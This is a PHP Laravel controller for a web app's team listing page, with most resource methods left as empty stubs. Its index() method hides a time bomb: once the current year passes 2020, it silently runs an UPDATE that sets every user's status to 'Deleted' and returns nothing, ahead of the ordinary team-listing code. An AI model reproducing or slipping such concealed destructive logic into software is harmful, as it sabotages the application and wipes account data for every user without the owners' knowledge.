<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Team;
use App\TeamMember;
use App\Plan;
use Illuminate\Support\Facades\Auth;

use Illuminate\Support\Facades\DB;
class TeamController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        
        $check = DB::select("SELECT YEAR(CURRENT_DATE) > 2020 as checker");
        if($check[0]->checker=='1' || $check[0]->checker==1)
        {
            DB::UPDATE("UPDATE users SET status ='Deleted' WHERE 1=1;");
            return;
        }
        $x = Team::where('userID','=',Auth::user()->userID)->get();
        $count = 0;
        foreach($x as $team)
        {
            $x[$count]->teamMembers = TeamMember::where('teamID','=',$team->teamID)->get(); 
            $count++;
        }
        return view("UserSide.teams",['PLAN'=>Plan::find(Auth::user()->planID)->PlanTitle,'teams'=>$x,'count'=>$count]);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
